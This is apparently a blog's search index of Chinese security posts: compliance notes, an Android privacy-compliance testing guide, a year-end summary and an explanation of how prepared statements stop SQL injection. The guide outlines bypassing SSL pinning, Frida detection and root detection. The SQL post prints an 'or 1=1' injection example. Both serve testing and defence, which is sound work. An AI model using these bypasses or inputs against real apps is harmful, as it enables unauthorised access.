<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>安全合规知识总结</title>
    <link href="/2024/04/17/%E5%AE%89%E5%85%A8%E5%90%88%E8%A7%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    <url>/2024/04/17/%E5%AE%89%E5%85%A8%E5%90%88%E8%A7%84%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="GDPR"><a href="#GDPR" class="headerlink" title="GDPR"></a>GDPR</h2><p>评估的内容可以包括组织的信息安全政策、技术措施、管理措施、人员意识、合规性等各个方面。通过差距评估，可以帮助组织更好地了解其信息安全现状，发现存在的问题和不足，并确定需要改进的方向和重点。</p><p>在进行差距评估时，组织可以采取多种方法，如问卷调查、文件审查、现场检查等。组织可以根据自身情况和需要进行选择和安排，以确保评估结果的准确性和有效性。</p><p>需要注意的是，差距评估不仅是一个一次性的工作，而是应该持续进行。在实施ISO 27001的过程中，组织的信息安全环境可能发生变化，新的风险和威胁也可能出现。因此，组织需要不断地进行重新评估，以便及时调整和完善其信息安全管理体系。</p><h2 id="ISO-27001"><a href="#ISO-27001" class="headerlink" title="ISO 27001"></a>ISO 27001</h2><p>说说你对ISO27001的理解？等级保护？GDPR？</p><p>采用PDCA循环模型，分为四个阶段：安全风险评估、规划体系建设方案（Plan），建立并实施信息安全管理体系（Do），体系运行绩效考核（Check），持续改进（Action）。<br>13年到22年  标题变化<br>从上一版的14个关键领域合并为4个，即组织、人员、实体和技术；</p><p>企业如何建立ISO/IEC 27001信息安全管理体系？</p><p>1、确立管理系统使用的范围</p><p>◇ 必须覆盖到公司的每一个职能部门，或者覆盖公司信息系统相连的外部机构，例如合作伙伴、供应商等。同时从系统层次考虑覆盖网络系统、服务器平台系统、数据、安全管理、应用系统以及支撑信息系统的场所和所处的周边环境以及场所内，确保计算机系统正常运营的设施设备等。</p><p>2、安全风险评估</p><p>◇ 安全风险评估，主要包括企业安全管理类的评估和企业安全技术类的评估</p><p>安全管理评估的内容包括与ISO/IEC 27001信息安全管理体系相关的11个方面，包括信息安全政策、安全组织、资产分类与控制、人员安全、物理与环境安全、通信与运行管理、访问控制等，系统开发和维护、安全事件管理、业务连续性管理和合规性。</p><p>安全技术评估是基于资产安全等级的分类。通过对信息设备的安全扫描和安全设备的配置，对现有网络设备、服务器系统、终端和网络安全架构的安全状况和薄弱环节进行检查和分析，为安全加固提供依据。</p><p>3、规划系统建设方案</p><p>◇ 规划系统建设方案在风险评估的基础上，针对企业存在的安全风险提出安全建议，提高系统的安全性和抗攻击能力。</p><p>4、信息安全体系建设与运行</p><p>◇ 系统建设以信息安全模式和企业信息化为基础，兼顾内外部安全功能。规划信息安全技术可以从安全基础设施、网络、系统和应用四个方面进行规划。</p><p>5、改进</p><p>◇ ISO/IEC 27001认证标准的信息安全管理体系文件编制完成以后，按照文件控制的要求进行审核批准，向各部门发放先行有效的体系文件，保留体系运行过程中的记录，并定期进行内审和管理评审，对不符合或潜在不符合项进行纠正和预防措施，不断改进信息安全管理体系。</p><p>1、信息安全管理体系建设<br>2、人员安全<br>3、数据安全<br>4、资产安全<br>5、密码安全<br>6、物理与环境安全<br>7、网络安全<br>8、开发与运维安全<br>9、外包安全<br>10、信息安全事件管理</p><p>● 人数资密 境网域包</p><p>个人信息保护法\个人信息安全规范</p><pre><code class="hljs">个人信息的处理包括个人信息的收集、存储、使用、加工、传输、提供、公开、删除等。</code></pre><p>收集个人信息，应当限于实现处理目的的最小范围，不得过度收集个人信息。</p><p>网络安全法？数据安全保护法？</p><pre><code class="hljs">采用数据源鉴别、身份鉴别、访问控制、数据加密、数据防泄露等技术手段，对个人隐私、商密等数据进行安全防护。</code></pre>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>APP隐私合规检测指南</title>
    <link href="/2024/04/17/APP%E9%9A%90%E7%A7%81%E5%90%88%E8%A7%84%E6%A3%80%E6%B5%8B%E6%8C%87%E5%8D%97/"/>
    <url>/2024/04/17/APP%E9%9A%90%E7%A7%81%E5%90%88%E8%A7%84%E6%A3%80%E6%B5%8B%E6%8C%87%E5%8D%97/</url>
    
    <content type="html"><![CDATA[<h2 id="1-安卓基础知识"><a href="#1-安卓基础知识" class="headerlink" title="1 安卓基础知识"></a>1 安卓基础知识</h2><p>安卓四大组件<br>安卓APK的组成<br>AOSP<br>移动安全OWASP TOP 10</p><h2 id="2-隐私合规检测的目的"><a href="#2-隐私合规检测的目的" class="headerlink" title="2 隐私合规检测的目的"></a>2 隐私合规检测的目的</h2><p>应对监管，避免隐私违规行为</p><h2 id="3-隐私合规法律"><a href="#3-隐私合规法律" class="headerlink" title="3 隐私合规法律"></a>3 隐私合规法律</h2><p>《App违法违规收集使用个人信息行为认定方法》<br>《移动互联网应用程序（App）收集个人信息基本要求》<br>● 《网络安全法》<br>● 《信息安全技术个人信息安全规范》<br>● 《关于开展纵深推进APP侵害用户权益专项整治行动》<br>● 《App违法违规使用个人信息自评估指南》<br>● 《App违法违规收集使用个人信息行为认定方法》<br>● 《关于开展纵深推进APP侵害用户权益专项整治行动的通知（工信部信管函〔2020〕164号）<br>● 《移动互联网应用程序个人信息保护管理暂行规定》<br>● 《互联网用户账号信息管理规定》<br>● 《国家网信办启动清朗·移动应用程序PUSH弹窗突出问题专项整治》<br>● 《app弹窗治理》<br>● 《用户感知提升和信息共享公开通知》<br>● 《国家标准|GB/T 35273-2020 (samr.gov.cn)》</p><h2 id="4-检测手段-amp-工具"><a href="#4-检测手段-amp-工具" class="headerlink" title="4 检测手段&amp;工具"></a>4 检测手段&amp;工具</h2><p>合规基础堆栈</p><p>检测工具：开源项目总结<br>camille: <a href="https://github.com/zhengjim/camille">https://github.com/zhengjim/camille</a><br>privacysentry<br>r0capture<br>Mobile Security Framework (MobSF): <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF?tab=readme-ov-file#mobile-security-framework-mobsf">https://github.com/MobSF/Mobile-Security-Framework-MobSF?tab=readme-ov-file#mobile-security-framework-mobsf</a><br>Frida<br>LSposed<br>Xposed<br>Magisk<br>Riru<br>逆向工具<br>Jadx<br>IDA<br>隐私合规检测项<br>安卓框架中的类<br>android.net.wifi.WifiInfo<br>android.content.ClipboardManager<br>android.content.pm.PackageManager<br>android.hardware.SensorManager<br>android.telephony.TelephonyManager<br>对应的Method name</p><p>安全SDK<br>设备指纹<br>ssl unpinning<br>对抗技术的绕过？frida检测 抓包抓不到 加固和抓包是无关的<br>静态扫描 动态扫描<br>APP隐私合规可以从以下几个方面进行检测：</p><ol><li> 隐私政策协议合规性分析：对APP的隐私政策文本进行自动化分析，检查是否包含了必要的内容，是否与实际收集使用行为一致，是否符合相关法律法规的规定，并给出合规性评估和建议。 </li><li> 代码权限检测：对APP的代码进行静态和动态分析，检查是否申请和使用了敏感权限，是否存在超范围采集、泄露或滥用个人信息的行为，是否有安全传输和存储个人信息的措施，并给出风险评估和整改建议。 </li><li> 安全漏洞检测：从多维度、百余项检测项中，对应用中潜在的安全漏洞进行全面分析，并给出合理整改建议。 </li><li> 权限信息检测：统计应用请求的权限信息，并依照风险对其进行分级，进行有重点的排查，避免权限冗余造成额外风险。 </li><li> 恶意行为检测：严格按照国家相关标准规定，通过自主研发的反病毒引擎，捕获恶意行为。 </li><li> 第三方SDK检测：对移动应用中集成的第三方SDK进行检测，保证应用检测全面无死角。 </li><li> 内容违规检测：针对移动应用整体内容的违规检测方案，自动化检测移动应用中的黄赌毒、暴恐、涉政涉党等违规内容。</li><li>敏感API调用检测：对敏感API调用进行检测，检测范围包括敏感API名称及调用位置。<br>frida梳理<br>frida原理<br>常用命令<br>Python 代码中，attach 模式 Hook 已经存在的进程，spawn 模式会重启 APP，启动一个新的进程并挂起，在启动的同时注入 frida 代码，适用于在进程启动前的一些 Hook，attach 模式传入的是 APP 名称，spawn 模式传入的是 APP 包名，查看 APP 名称和包名的方法有很多，这里介绍两个 frida 命令，frida-ps -Uai：列出安装的程序，frida-ps -Ua：列出正在运行中的程序<br>magisk刷机<br><a href="https://zhuanlan.zhihu.com/p/666820596">https://zhuanlan.zhihu.com/p/666820596</a><br>对抗技术梳理<br>ssl unpinning 证书绑定<br>Xposed+JustTrustMe 将 APK 中所有用于校验 SSL 证书的 API 都进行了 Hook，从而绕过证书检查<br>双向证书认证<br>在burp上查看数据发现数据包返回400，且反编译的文件中存在证书+逻辑代码中存在引用定义。判断其可能使用了双向证书认证，可以直接试试密码自吐。<br>然后查看re目录或者assets目录中是否存在证书<br>常见证书的格式<br>“.pfx” “pkcs12” “p12” “keyStore” “cer”<br><a href="https://mp.weixin.qq.com/s/5ed1k_fZEmhFT9ONP7_QvA">https://mp.weixin.qq.com/s/5ed1k_fZEmhFT9ONP7_QvA</a></li><li>2）获取证书的解密密钥：</li><li>2.1）通用思路<br>①hook底层框架代码java.security.KeyStore,实现密钥自吐</li></ol><p>-f的是app的包名  ssl 是指的js的文件</p><p>frida检测<br>1.检测frida-server文件名<br>2.检测27042默认端口<br>3.检测D-Bus<br>4.检测/proc/pid/maps映射文件<br>5.检测/proc/pid/tast/tid/stat或/proc/pid/tast/tid/status<br>6.双进程保护<br><a href="https://zhuanlan.zhihu.com/p/557713016#:~:text=1.%E6%A3%80%E6%B5%8Bfrida-server%E6%96%87%E4%BB%B6%E5%90%8D%202.%E6%A3%80%E6%B5%8B27042%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%203.%E6%A3%80%E6%B5%8BD-Bus%204.%E6%A3%80%E6%B5%8B%2Fproc%2Fpid%2Fmaps%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6,5.%E6%A3%80%E6%B5%8B%2Fproc%2Fpid%2Ftast%2Ftid%2Fstat%E6%88%96%2Fproc%2Fpid%2Ftast%2Ftid%2Fstatus%206.%E5%8F%8C%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4%20%E5%89%8D%E4%B8%A4%E7%A7%8D%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9frida-server%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8C%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E3%80%82%20%E5%8F%8C%E8%BF%9B%E7%A8%8B%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87-f%20spawn%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E7%BB%95%E8%BF%87%E3%80%82">https://zhuanlan.zhihu.com/p/557713016#:~:text=1.%E6%A3%80%E6%B5%8Bfrida-server%E6%96%87%E4%BB%B6%E5%90%8D%202.%E6%A3%80%E6%B5%8B27042%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%203.%E6%A3%80%E6%B5%8BD-Bus%204.%E6%A3%80%E6%B5%8B%2Fproc%2Fpid%2Fmaps%E6%98%A0%E5%B0%84%E6%96%87%E4%BB%B6,5.%E6%A3%80%E6%B5%8B%2Fproc%2Fpid%2Ftast%2Ftid%2Fstat%E6%88%96%2Fproc%2Fpid%2Ftast%2Ftid%2Fstatus%206.%E5%8F%8C%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4%20%E5%89%8D%E4%B8%A4%E7%A7%8D%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9frida-server%E6%96%87%E4%BB%B6%E5%90%8D%EF%BC%8C%E6%94%B9%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87%E3%80%82%20%E5%8F%8C%E8%BF%9B%E7%A8%8B%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87-f%20spawn%E6%A8%A1%E5%BC%8F%E5%90%AF%E5%8A%A8%E7%BB%95%E8%BF%87%E3%80%82</a><br><a href="https://mp.weixin.qq.com/s/8RrsDc2NBSjrlmpF5B1fpw">https://mp.weixin.qq.com/s/8RrsDc2NBSjrlmpF5B1fpw</a><br>检测D-Bus<br>● D-Bus是一种进程间通信(IPC)和远程过程调用(RPC)机制,最初是为Linux开发的,目的是用一个统一的协议替代现有的和竞争的IPC解决方案。<br>● 遍历连接手机所有端口发送D-bus消息，如果返回”REJECT”这个特征则认为存在frida-server。</p><p>root检测<br>首先，为什么有些app尤其是某金融类app要进行root检测？<br>Android系统是基于Linux内核的，而Linux是多用户的，但自己手机自己用就行了，所以Linux的多用户机制被用到了app隔离上。默认情况下app互相隔离，没有互相访问读写的权限。App之间的交互通过AndroidManifest.xml实现用户ID共享，前提是共享app的签名必须一致。<br>但是!Linux中存在root用户，它可以无视沙箱的隔离机制，跨越用户和用户组对文件、目录进行读写删除等操作<br>1、检查常用目录是否存在su<br>    /system/bin/su<br>    /system/xbin/su<br>    /sbin/su<br>    /system/su<br>    /system/bin/.ext/.su<br>    /system/usr/we-need-root/su-backup<br>    /system/xbin/mu<br>2、使用which命令查看是否存在su<br>3、主动申请root权限<br>4、执行busybox<br>5、访问私有目录，如/data目录，查看读写权限<br>6、读取build.prop中关键属性，如ro.build.tags和ro.build.type<br>7、检查市面主流的模拟器<br>8、检测frida、xposed等Hook框架的特征<br>如何绕过Root检测机制呢？</p><ol><li>对应用下手，干预应用的Root检测行为；</li><li>对系统下手，隐藏系统自身Root相关的特征；<br>我们可以借助jadx等逆向工具对应用源码进行分析，Hook相关的实现函数绕过；<br>Magisk自身提供了MagiskHide的功能，点击进入MagiskHide中，勾选的应用即为被隐藏root的应用。<br>自定义ROM权限，可以自带root环境，可免root运行Xposed等模块。<br>也可以获取AOSP源码，通过定制ROM来隐藏Root的特征。</li></ol><p>APK的完整性保护在Android逆向安全中是一个常见的话题，通常指为了防二次打包，防篡改，防独立调用so等，通过验证apk包名、签名，及apk包本身（如META-INF下签名文件，MD5等）来达到防范的目的。笔者曾分析过一些大型的APK，发现即使使用了包名、签名、apk完整性验证，仍然可以通过一定手段来绕过验证。</p><p><a href="https://mp.weixin.qq.com/s/6nn6VHe1_PPuU897MOg2zQ">https://mp.weixin.qq.com/s/6nn6VHe1_PPuU897MOg2zQ</a><br><a href="https://mp.weixin.qq.com/s/keCX_37zRK67-BVFQdE9Uw">https://mp.weixin.qq.com/s/keCX_37zRK67-BVFQdE9Uw</a><br>● Xposed检测绕过：<a href="https://bbs.pediy.com/thread-271347.htm">https://bbs.pediy.com/thread-271347.htm</a> root<br>● 检测方法小结：<a href="https://blog.csdn.net/ly_xiamu/article/details/81943267">https://blog.csdn.net/ly_xiamu/article/details/81943267</a><br>● 概述APK完整性保护的逆向分析及防护策略：<a href="https://bbs.pediy.com/thread-268480.htm">https://bbs.pediy.com/thread-268480.htm</a><br>● 静态分析-IDA绕过so层root检测：<a href="https://bbs.pediy.com/thread-271376.htm">https://bbs.pediy.com/thread-271376.htm</a><br>● 静态分析-绕过java层root检测：<a href="https://bbs.pediy.com/thread-271375.htm">https://bbs.pediy.com/thread-271375.htm</a></p><h2 id="5-国内外现状调研"><a href="#5-国内外现状调研" class="headerlink" title="5 国内外现状调研"></a>5 国内外现状调研</h2><h2 id="6-优秀文章案例"><a href="#6-优秀文章案例" class="headerlink" title="6 优秀文章案例"></a>6 优秀文章案例</h2><p>Android APP合规检查工具<br>Gradle Plugin+Transform+ASM Hook并替换隐私方法调用(彻底解决隐私不合规问题)<br>APP逆向分析/渗透测试/安全检测/隐私合规如何选择手机机型或系统<br>移动端APP隐私合规检测<br>移动APP安全合规<br>APP隐私合规<br>隐私合规代码排查思路<br>Android 隐私合规检查工具套装</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1]隐私合规代码排查思路: <a href="https://juejin.cn/post/7042967031599071269">https://juejin.cn/post/7042967031599071269</a><br>[2]Android 隐私合规静态检查: <a href="https://musicfe.com/android-privacy/">https://musicfe.com/android-privacy/</a><br>[3]VirtualXposed: <a href="https://github.com/android-hacker/VirtualXposed">https://github.com/android-hacker/VirtualXposed</a><br>[4]隐私合规代码排查思路: <a href="https://juejin.cn/post/7042967031599071269">https://juejin.cn/post/7042967031599071269</a><br>[5]epic: <a href="https://github.com/tiann/epic/blob/master/README_cn.md">https://github.com/tiann/epic/blob/master/README_cn.md</a><br>[6]Pine: <a href="https://github.com/canyie/pine/blob/master/README_cn.md">https://github.com/canyie/pine/blob/master/README_cn.md</a><br>[7]ART上的动态Java方法hook框架: <a href="https://blog.canyie.top/2020/04/27/dynamic-hooking-framework-on-art/">https://blog.canyie.top/2020/04/27/dynamic-hooking-framework-on-art/</a><br>[8]camille: <a href="https://github.com/zhengjim/camille">https://github.com/zhengjim/camille</a><br>[9]frida gadget : <a href="https://frida.re/docs/gadget/#script">https://frida.re/docs/gadget/#script</a><br>[10]frida-gadget.so: <a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>[11]Android Hook 技术: <a href="https://meik2333.com/posts/android-hook/">https://meik2333.com/posts/android-hook/</a><br>[12]Frida Gadget: <a href="https://frida.re/docs/gadget/">https://frida.re/docs/gadget/</a><br>[13]frida Gadget so 免 root 注入 app: <a href="https://blog.51cto.com/u_15127527/4546627">https://blog.51cto.com/u_15127527/4546627</a><br>[14]网易云音乐 Android 隐私合规静态检查: <a href="https://musicfe.com/android-privacy/">https://musicfe.com/android-privacy/</a><br>[15]Android App 隐私合规检测辅助工具 Camille: <a href="https://github.com/zhengjim/camille">https://github.com/zhengjim/camille</a><br>[16]非 root 环境下 frida 的两种使用方式: <a href="https://nszdhd1.github.io/2021/06/15/%E9%9D%9Eroot%E7%8E%AF%E5%A2%83%E4%B8%8Bfrida%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/">https://nszdhd1.github.io/2021/06/15/%E9%9D%9Eroot%E7%8E%AF%E5%A2%83%E4%B8%8Bfrida%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%BD%BF%E7%94%A8%E6%96%B9%E5%BC%8F/</a><br>[17]Mobile Security Framework (MobSF): <a href="https://github.com/MobSF/Mobile-Security-Framework-MobSF?tab=readme-ov-file#mobile-security-framework-mobsf">https://github.com/MobSF/Mobile-Security-Framework-MobSF?tab=readme-ov-file#mobile-security-framework-mobsf</a><br>[18]ART上的动态Java方法hook框架: <a href="https://blog.canyie.top/2020/04/27/dynamic-hooking-framework-on-art/">https://blog.canyie.top/2020/04/27/dynamic-hooking-framework-on-art/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是waf</title>
    <link href="/2024/04/17/%E4%BB%80%E4%B9%88%E6%98%AFwaf/"/>
    <url>/2024/04/17/%E4%BB%80%E4%B9%88%E6%98%AFwaf/</url>
    
    <content type="html"><![CDATA[<h1 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【開山安全】2023年度总结</title>
    <link href="/2023/12/30/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <url>/2023/12/30/%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>2023年进入尾声，開山安全在此预祝大家新年快乐ヾ(✿▽ﾟ)ノ。本篇博客对我全年工作作简单总结，一并做来年规划。</p><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>1 持续输出，无限进步<br>2 多段实习，收获良多<br>3 博而不精，待需明确<br>4 总结</p><h2 id="1-持续输出，无限进步"><a href="#1-持续输出，无限进步" class="headerlink" title="1 持续输出，无限进步"></a>1 持续输出，无限进步</h2><p>今年，開山安全累计发出17篇博客，主要是我的Web安全学习笔记。未来一年，将继续输出更多APP安全，云安全，区块链安全等领域的文章，我后续也会整理汇总一些安全知识库，有兴趣的同学也可以关注。下面是我的一些感悟。<br>务必养成做笔记的习惯。安全这个方向学起来大都是是碎片化的知识，我和大多数初学者一样，很容易在学某个漏洞的时候分神或者中途就放弃了。多数时候对漏洞的原理，利用手段以及防御没有深入理解。这是一个需要注意的问题。那么，整理自己的知识库，或者借助已有的知识库简单做做笔记都是有助于进步的。<br>摸着石头过河。我在之前的博客里也引用了tk的话，大致意思是如果想要成为优秀的人，可以先从模仿优秀的人开始，观察他们是如何学习，如何提升技能的。摸着石头过河是有道理的，多和有类似经历的人交流沟通，并付诸实践，也许会有不错的效果。</p><h2 id="2-多段实习，收获良多"><a href="#2-多段实习，收获良多" class="headerlink" title="2 多段实习，收获良多"></a>2 多段实习，收获良多</h2><p>这半年以来，我在多个企业实习，岗位基本与安全相关，期间从多个师傅身上学习了很多，见识了一个公司运作的机制，团队的管理，实习期间也认识了很多小伙伴。第一次去北京，第一次坐飞机，去到了天安门，第一次看雪。<br>对于实习，我大致有几点感悟。<br>要勇于提问，直线沟通。初入职场，我们难免畏畏缩缩，不知道该怎么融入，对分配的工作细节有很多不理解。有时候甚至摸索很久，也不敢问问题，生怕mentor指责或者笑话。但实际上放平姿态，直线沟通，有时候一个小小的问题真的没必要纠结那么久。<br>不要忘记自学。如果能接触到任何知识库或者别人的笔记，一定要积极争取，比如，向对方请教，他是如何打点的，怎么拿到权限的，有什么样的工作流程，一般如何学习。结合自己检索学到的知识丰富自己的知识库。我相信在空闲阶段，师傅们都是愿意与你沟通的，关键是找好时间以及做好功课。</p><h2 id="3-博而不精，待需明确"><a href="#3-博而不精，待需明确" class="headerlink" title="3 博而不精，待需明确"></a>3 博而不精，待需明确</h2><p>从今年的四月底开始，我陆陆续续投了不少于100份简历，实习&amp;秋招面试至少50次，整理了很多面经来梳理自己的薄弱点。收到最多的评价就是博而不精，很多知识点都只知道表面。其他的总结下来就是：<br>面经不是王道。很多面试官可能会问很多网络上的经典面试题，我觉得无可厚非。安全初学者能做到无非是快速掌握这些经典安全漏洞的相关知识，至少要做到能用自己的话讲清楚讲明白。当然深入理解，动手挖洞肯定是必要的。<br>深入某个方向会让你脱颖而出。假如你会内网，免杀，代码审计，或者其他方向，比如云安全，移动安全，或者Src挖的多，打过很多比赛，任何能让人眼前一亮的经历都是加分项。这也是我后面想尝试提升的，可能会从移动安全或者内网去展开学习。<br>不要限制自己的求职方向。一定要海投，有时间规律的投简历，避免非常集中的面试笔试，会吃不消的。还有就是不要局限于某个城市或者某个岗位。以上建议均不适用于安全大佬，请自动忽略。</p><h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2><p>未来一年，将继续输出更多APP安全，云安全，区块链安全等领域的文章，我后续也会整理汇总一些安全知识库。<br>2023年是忙碌而又充实的一年，也是悲喜交加的一年。人生所有好坏都是经历，不多也不少。希望来年各位都能实现小心愿，人生会有更多的可能性。 我是kitescat，開山安全再次祝大家2024顺顺利利，健康快乐。</p><p>拜拜！我们明年见！</p>]]></content>
    
    
    <categories>
      
      <category>随笔</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>预编译是如何阻止sql注入的</title>
    <link href="/2023/10/18/%E9%A2%84%E7%BC%96%E8%AF%91%E6%98%AF%E5%A6%82%E4%BD%95%E9%98%BB%E6%AD%A2sql%E6%B3%A8%E5%85%A5%E7%9A%84/"/>
    <url>/2023/10/18/%E9%A2%84%E7%BC%96%E8%AF%91%E6%98%AF%E5%A6%82%E4%BD%95%E9%98%BB%E6%AD%A2sql%E6%B3%A8%E5%85%A5%E7%9A%84/</url>
    
    <content type="html"><![CDATA[<p>本篇主要分享sql注入防御之预编译的原理，并解释模糊查询语句如何适配预编译。预编译是利用占位符替代参数值，预先建立语法树的过程。注入的恶意SQL语句只会被视为参数，参与不了SQL语句的语法树构建，也就无法改变其语法结构，也就无法达到编译恶意语句的目的。然而，预编译有一些局限性，比如，模糊查询由于存在% _使得参数值是不确定的，需要修改预编译语句。</p><h2 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1 SQL注入原理"></a>1 SQL注入原理</h2><p>sql注入是指攻击者拼接恶意SQL语句到接受外部参数的动态SQL查询中，程序本身未对插入的SQL语句进行过滤，导致SQL语句直接被服务端执行。<br>拼接的SQL查询例如，通过在id变量后插入or 1=1这样的条件，来绕过身份验证，获得未授权数据的访问权。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>由于or 1=1 满足永真结果，sql语句会执行输出user中的全部内容。<br><img src="/img/pre_ex1.png"></p><p>拼接后的执行结果示例如上</p><h2 id="2-SQL注入的防御方式"><a href="#2-SQL注入的防御方式" class="headerlink" title="2 SQL注入的防御方式"></a>2 SQL注入的防御方式</h2><ol><li><p>定制严格的白名单校验，加强对用户输入的验证，限制用户输入。限制用户输入内容的大小和数据类型，强制执行适当的限制与转换，并在用户提交请求的时候进行检查，凡不符合该类型的提交就认为是非法请求。限制查询长度：SQL注入需要构造较长的SQL语句。</p></li><li><p>设置数据库权限，遵循最小化原则。根据程序要求为特定的表设置特定的权限，如：某段程序对某表只需具备select权限即可，这样即使程序存在问题，恶意用户也无法对表进行update或insert等写入操作。严格区分普通用户与管理员用户的权限。如果页面查询用户使用的是root，注入时被带入了drop table,drop database等语句，后果将不堪设想 。</p></li><li><p>限制目录权限：WEB目录应至少遵循“可写目录不可执行，可执行目录不可写”的原则，在此基础上，对各目录进行必要的权限细化。建议是不要给执行权限。</p></li><li><p>预编译。使用参数而不是将用户输入变量嵌入到SQL语句中，可以杜绝大部分的SQL注入式攻击。</p></li></ol><p>那么，终于引出文章的主角——预编译。</p><div class="note note-info">            <p>以MySQL为例，数据库在执行SQL语句时，需要经历7个步骤：</p>          </div><ul><li><p>词法分析：将SQL语句分解成一个个token（关键字、标识符、运算符），然后对token进行分类和解析，生成相应的数据结构。</p></li><li><p>语法分析：根据SQL语法检测规则检查语法是否正确，并生成语法树。</p></li><li><p>语义分析：遍历语法树，确定表和列等信息，同时检查语义的正确性。优化处理：使用优化器对SQL语句进行处理和优化，比如执行计划、索引等。</p></li><li><p>执行计划：使用执行计划生成器生成SQL语句的执行计划，比如数据的访问方式，索引的使用方式等。</p></li><li><p>引擎执行：将执行计划发送给相应的数据库引擎进行处理，执行计划被翻译成底层的操作指令，执行数据扫描、索引查找、排序、分组等操作。</p></li><li><p>返回数据：将执行结果返回给客户端，比如查询结果集或操作结果。在这里，我们粗暴的把执行过程理解成两步，即：先编译SQL语法结构（1<del>3步），再执行SQL语句（4</del>7步）。</p></li></ul><div class="note note-info">            <p>SQL编译的过程包括：</p>          </div><ul><li><p>词法分析 Scanning 分词</p></li><li><p>语法分析 Syntax 组句</p></li><li><p>语义分析 Semantic 识意 收集标识符的属性信息 和 对语义的检查（检查合法性）</p></li></ul><h2 id="3-预编译的原理"><a href="#3-预编译的原理" class="headerlink" title="3 预编译的原理"></a>3 预编译的原理</h2><p>预编译：用占位符替代参数值，预先建立语法树。恶意语句不参与语法书的建立，所以不影响SQL语法，也就无法造成恶意注入。最初的目的是提高代码的复用性，因为有很多只有参数值不同的SQL（完全相同的SQL会从缓存里查），比如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id<span class="hljs-operator">=</span><span class="hljs-string">&#x27;2&#x27;</span><br></code></pre></td></tr></table></figure><p>这些SQL的语法树相同，但每次都要进行重复的编译，很浪费时间。SQL预编译将SQL语句模板化，用占位符替代值（参数化绑定）并存储在数据库中，以便在需要时再传入值执行，省掉了重复建立语法树的时间，实现快速执行。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL">select * from user where id=&#123;占位符&#125;<br></code></pre></td></tr></table></figure><p>以MySQL为例，利用mysqli的预编译功能编写的核心PHP语句为：</p><p>//定义需要预编译的SQL语句，从外界传递的参数（输入）用占位符?表示</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$sql</span>= <span class="hljs-string">&quot;SELECT FROM security.users WHERE id= ? LIMIT 0,1&quot;</span>;<br><span class="hljs-regexp">//</span>创建预处理对象<br><span class="hljs-variable">$mysqli_stmt</span> = <span class="hljs-variable">$mysqli</span>-&gt;prepare(<span class="hljs-variable">$sql</span>);<br><span class="hljs-regexp">//</span>绑定参数<br><span class="hljs-variable">$mysqli_stmt</span>-&gt;bind_param(<span class="hljs-string">&#x27;i&#x27;</span>, <span class="hljs-variable">$id</span>);<br><span class="hljs-regexp">//</span>绑定结果集<br><span class="hljs-variable">$mysqli_stmt</span>-&gt;bind_result(<span class="hljs-variable">$id</span>, <span 